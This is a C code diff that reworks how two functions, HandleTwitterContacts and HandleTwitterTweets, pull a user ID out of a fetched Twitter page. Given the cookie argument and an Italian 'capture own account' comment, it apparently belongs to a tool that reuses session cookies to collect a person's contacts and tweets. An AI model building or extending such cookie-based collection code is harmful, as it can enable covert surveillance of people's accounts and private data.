@@ -170,22 +170,24 @@ DWORD HandleTwitterContacts(char *cookie)
 	if (ret_val != SOCIAL_REQUEST_SUCCESS)
 		return ret_val;
 
-	parser1 = (char *)strstr((char *)r_buffer, "data-user-id=\"");
-	if (!parser1) {
-		SAFE_FREE(r_buffer);
-		return SOCIAL_REQUEST_BAD_COOKIE;
-	}
-	parser1 += strlen("data-user-id=\"");
-	parser2 = (char *)strchr((char *)parser1, '\"');
-	if (!parser2) {
-		SAFE_FREE(r_buffer);
-		return SOCIAL_REQUEST_BAD_COOKIE;
-	}
-	*parser2=0;
-	_snprintf_s(user, sizeof(user), _TRUNCATE, "%s", parser1);
-	if (strlen(user) == 0) {
-		SAFE_FREE(r_buffer);
-		return SOCIAL_REQUEST_BAD_COOKIE;
+	parser1 = (char *)r_buffer;
+	LOOP {
+		parser1 = (char *)strstr((char *)parser1, "data-user-id=\"");
+		if (!parser1) {
+			SAFE_FREE(r_buffer);
+			return SOCIAL_REQUEST_BAD_COOKIE;
+		}
+		parser1 += strlen("data-user-id=\"");
+		parser2 = (char *)strchr((char *)parser1, '\"');
+		if (!parser2) {
+			SAFE_FREE(r_buffer);
+			return SOCIAL_REQUEST_BAD_COOKIE;
+		}
+		*parser2=0;
+		_snprintf_s(user, sizeof(user), _TRUNCATE, "%s", parser1);
+		if (strlen(user)) 
+			break;
+		parser1 = parser2 + 1;
 	}
 
 	// Cattura il proprio account
@@ -329,23 +331,26 @@ DWORD HandleTwitterTweets(char *cookie)
 	if (ret_val != SOCIAL_REQUEST_SUCCESS)
 		return ret_val;
 
-	parser1 = (char *)strstr((char *)r_buffer, "data-user-id=\"");
-	if (!parser1) {
-		SAFE_FREE(r_buffer);
-		return SOCIAL_REQUEST_BAD_COOKIE;
+	parser1 = (char *)r_buffer;
+	LOOP {
+		parser1 = (char *)strstr((char *)parser1, "data-user-id=\"");
+		if (!parser1) {
+			SAFE_FREE(r_buffer);
+			return SOCIAL_REQUEST_BAD_COOKIE;
+		}
+		parser1 += strlen("data-user-id=\"");
+		parser2 = (char *)strchr((char *)parser1, '\"');
+		if (!parser2) {
+			SAFE_FREE(r_buffer);
+			return SOCIAL_REQUEST_BAD_COOKIE;
+		}
+		*parser2=0;
+		_snprintf_s(user, sizeof(user), _TRUNCATE, "%s", parser1);
+		if (strlen(user)) 
+			break;
+		parser1 = parser2 + 1;
 	}
-	parser1 += strlen("data-user-id=\"");
-	parser2 = (char *)strchr((char *)parser1, '\"');
-	if (!parser2) {
-		SAFE_FREE(r_buffer);
-		return SOCIAL_REQUEST_BAD_COOKIE;
-	}
-	*parser2=0;
-	_snprintf_s(user, sizeof(user), _TRUNCATE, "%s", parser1);
-	SAFE_FREE(r_buffer);
 
-	if (strlen(user) == 0) 
-		return SOCIAL_REQUEST_BAD_COOKIE;
-	
+	SAFE_FREE(r_buffer);
 	return ParseTweet(user, cookie);
 }
